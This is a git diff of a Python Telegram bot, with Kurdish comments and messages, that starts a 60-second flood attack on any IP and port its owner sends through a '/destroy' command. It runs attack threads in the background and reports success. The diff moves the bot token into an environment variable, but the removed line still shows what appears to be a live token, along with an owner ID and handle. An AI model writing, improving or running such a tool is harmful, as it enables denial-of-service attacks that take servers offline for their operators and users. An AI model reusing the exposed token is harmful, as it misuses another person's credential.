@@ -1,4 +1,4 @@
-import asyncio
+import os
 import socket
 import threading
 import sys
@@ -6,9 +6,8 @@ import time
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
-# توکنی بۆتی تلگرامەکەت لێرە دادەنێیت
-TOKEN = "9083609558:AAFBj4PLZ1ImUrH1GdzcJASmfiEg1ChDjdA"
-# ناوی کاربەری خۆت یان ئایدیەت بۆ ئەوەی تەنها خۆت بۆتەکە کۆنتڕۆڵ بکەیت
+# خوێندنەوەی توکن لە ژینگەی گیتهاب (GitHub Secrets)
+TOKEN = os.getenv("BOT_TOKEN")
 OWNER_ID = 5527152252  # ئایدی تلگرامی خۆت لێرە بنووسە
 
 def flood_worker(ip, port, duration):
@@ -36,11 +35,8 @@ def start_attack_thread(ip, port, duration=60):
         t.daemon = True
         t.start()
 
-# فەنکشنی فەرمانی /destroy لە تلگرام
 async def destroy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
-    # دڵنیابوونەوە لەوەی تەنها خاوەن فەرمانەکە بەکاربێنێت
     if user_id != OWNER_ID:
         await update.message.reply_text("💀 تۆ ڕێگەپێدراو نییت، ئەم بۆتە تەنها بۆ خاوەنە (@alonee427)!")
         return
@@ -55,16 +51,18 @@ async def destroy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(f"🌋 **هێرشی بۆڕکان دەستی پێکرد!**\n🎯 ئامانج: `{ip}:{port}`\n⚡️ بارودۆخ: توند و بێبەزەیی...")
 
-    # دەستپێکردنی هێرشەکە لە پشتەوە (Background Thread)
     threading.Thread(target=start_attack_thread, args=(ip, port, 60)).start()
-    
     await update.message.reply_text(f"💀 شەپۆلی هێرشەکە سەرکەوتووانە نێردرا بۆ سێرڤەرەکە!")
 
 def main():
+    if not TOKEN:
+        print("❌ هەڵە: توکنی بۆت دۆزراوەتەوە لە ژینگەی سیستەمدا!")
+        sys.exit(1)
+        
     app = ApplicationBuilder().token(TOKEN).build()
     app.add_handler(CommandHandler("destroy", destroy_command))
     
-    print("💀 بۆتی تلگرام ئامادەیە و چاوەڕێی فەرمانی خاوەن دەکات...")
+    print("💀 بۆتی ServerCrackerBot ئامادەیە و لەژێر چاودێریدایە...")
     app.run_polling()
 
 if __name__ == "__main__":
